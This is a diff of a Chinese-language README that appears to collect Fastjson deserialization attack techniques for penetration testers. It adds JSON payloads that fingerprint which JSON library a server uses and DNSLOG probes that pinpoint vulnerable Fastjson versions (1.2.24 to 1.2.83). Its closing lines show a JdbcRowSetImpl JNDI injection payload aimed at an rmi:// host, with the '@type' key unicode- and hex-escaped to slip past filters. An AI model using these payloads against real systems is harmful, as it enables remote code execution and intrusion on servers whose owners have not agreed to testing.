@@ -3,11 +3,13 @@
 Fastjson姿势技巧集合
 
 ## 说明
-高版本的一些细节还有待更新。本项目涉及的一些姿势和payload是从之前的随手记的笔记直接粘进来的，很多找不到出处了所以来源未贴出来，忘师傅们见谅。
+- 本项目涉及的一些姿势和payload是从之前的随手记的笔记直接粘进来的，很多找不到出处了所以来源未贴出来，望师傅们见谅。
+- 高版本的很多细节还有待更新。
+- 浅蓝Kcon议题内容由su18师傅整理
 
 
 ## 自我提问
-学完后应该能回答如下问题。
+新手，学完后应该能回答如下问题。
 
 1. parse 和 parseObject的区别
 2. 主要exp有哪几种
@@ -19,6 +21,60 @@ Fastjson姿势技巧集合
 8. 1.2.68绕过原理是什么
 
 
+## 判断是否用了fastjson
+
+### 鉴别fastjson
+
+DNSLOG 
+```
+{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog.com"}} 
+```
+```
+{{"@type":"java.net.URL","val":"http://dnslog.com"}:"a"}
+```
+
+根据解析变化 
+```
+{"a":new a(1),"b":x'11',/*\*\/"c":Set[{}{}],"d":"\u0000\x00"} {"ext":"blue","name":{"$ref":"$.ext"}}
+```
+根据响应状态 
+```
+{"@type":"whatever"}
+```
+### 鉴别org.json
+
+特殊字符 
+```
+{a:'\r'}
+```
+### 鉴别gson
+
+浮点类型精度丢失 
+```
+{a:1.111111111111111111111111111}
+```
+注释符 
+```
+#\r\n{a:1}
+```
+### 鉴别jackson
+
+浮点类型精度丢失 
+```
+{a:1.111111111111111111111111111}
+```
+注释符 
+```
+{a:1}/*#aaaa
+```
+不支持单引号作为界定符 
+```
+{'a':'b'}
+```
+多余的类成员 
+```
+{"name":"a","age":18}
+```
 
 ## 探测
 
@@ -112,6 +168,80 @@ Set[{"@type":"java.net.URL","val":"http://dnslog"}
 https://github.com/pen4uin/awesome-java-security/tree/main/alibaba%20fastjson
 ```
 [{"@type":"java.net.CookiePolicy"},{"@type":"java.net.Inet4Address","val":"ydk3cz.dnslog.cn"}]
+```
+
+### 关键rce版本探测
+
+1.2.24 版本，用上面的延时探测即可
+
+1.2.47 版本
+
+```
+[
+  {
+    "@type": "java.lang.Class",
+    "val": "java.io.ByteArrayOutputStream"
+  },
+  {
+    "@type": "java.io.ByteArrayOutputStream"
+  },
+  {
+    "@type": "java.net.InetSocketAddress"
+  {
+    "address":,
+    "val": "dnslog"
+  }
+}
+]
+```
+
+1.2.68版本
+```
+[
+  {
+    "@type": "java.lang.AutoCloseable",
+    "@type": "java.io.ByteArrayOutputStream"
+  },
+  {
+    "@type": "java.io.ByteArrayOutputStream"
+  },
+  {
+    "@type": "java.net.InetSocketAddress"
+  {
+    "address":,
+    "val": "dnslog"
+  }
+}
+]
+```
+1.2.80 版本探测 如果收到了两个 dns 请求，则证明使用了 1.2.83 版本 如果收到了一个 dns 请求，则证明使用了 1.2.80 版本
+
+```
+[
+  {
+    "@type": "java.lang.Exception",
+    "@type": "com.alibaba.fastjson.JSONException",
+    "x": {
+      "@type": "java.net.InetSocketAddress"
+  {
+    "address":,
+    "val": "first.dnslog.cn"
+  }
+}
+},
+  {
+    "@type": "java.lang.Exception",
+    "@type": "com.alibaba.fastjson.JSONException",
+    "message": {
+      "@type": "java.net.InetSocketAddress"
+  {
+    "address":,
+    "val": "second.dnslog.cn"
+  }
+}
+}
+]
+
 ```
 
 
@@ -1027,3 +1157,5 @@ Fastjson默认会去除键、值外的空格、`\b`、`\n`、`\r`、`\f`等，�
 
 {"\u0040\u0074\u0079\u0070\u0065":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.251.0.111:9999","autoCommit":true}  {"\x40\x74\x79\x70\x65":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.251.0.111:9999","autoCommit":true}
 ```
+
+
